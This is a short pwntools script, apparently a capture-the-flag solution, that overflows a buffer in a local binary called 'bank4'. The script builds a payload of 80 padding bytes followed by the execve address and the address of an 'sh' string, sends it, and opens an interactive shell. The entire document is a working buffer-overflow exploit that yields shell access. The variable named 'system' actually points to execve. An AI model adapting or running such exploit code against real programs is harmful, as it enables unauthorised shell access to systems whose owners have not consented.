from pwn import *

io = process('./bank4')
elf = ELF('./bank4')

sh = next(elf.search(b'sh'))
system = elf.sym['execve']
print(hex(sh))
payload = b'A'*80+p32(system)+p32(system)+p32(sh)

print(io.recvuntil(': '))
pause()
io.sendline(payload)
io.interactive()
